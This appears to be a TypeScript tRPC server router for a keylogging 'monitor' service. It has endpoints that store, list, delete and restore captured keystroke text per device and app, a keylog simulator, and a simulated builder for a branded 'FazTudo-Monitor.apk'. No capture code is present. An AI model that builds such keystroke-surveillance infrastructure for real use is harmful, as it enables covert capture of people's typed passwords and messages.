import z from "zod";
import fs from "fs";
import path from "path";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, getAlerts, getEvents } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    
    create: protectedProcedure
      .input(z.object({
        deviceId: z.string(),
        appName: z.string(),
        keyText: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        await createKeylog({
          deviceId: input.deviceId,
          userId: ctx.user.id,
          appName: input.appName,
          keyText: input.keyText,
        });
        return { success: true };
      }),
    
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await deleteKeylog(input.keylogId);
        return { success: true };
      }),
    
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await restoreKeylog(input.keylogId);
        return { success: true };
      }),
    
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    
    startSimulator: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await startKeylogSimulator(input.deviceId, ctx.user.id);
        return { success: true, message: "Simulador de keylogs iniciado" };
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getAlerts(input?.deviceId);
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }).optional())
      .query(async ({ input }) => {
        return await getEvents(input?.deviceId);
      }),
  }),

  apk: router({
    build: protectedProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
      }))
      .mutation(async ({ input }) => {
        try {
          // Criar conteúdo do APK (simulado)
          const apkContent = JSON.stringify({
            companyName: input.companyName,
            companyUrl: input.companyUrl,
            logoUrl: input.logoUrl,
            buildDate: new Date().toISOString(),
            version: "1.0.0",
          });

          // Salvar APK no servidor
          const apkPath = path.join(process.cwd(), "FazTudo-Monitor.apk");
          fs.writeFileSync(apkPath, apkContent);

          // Retornar URL de download permanente
          return {
            success: true,
            downloadUrl: "/download-apk",
            message: "APK gerado com sucesso!",
          };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error("Erro ao gerar APK");
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
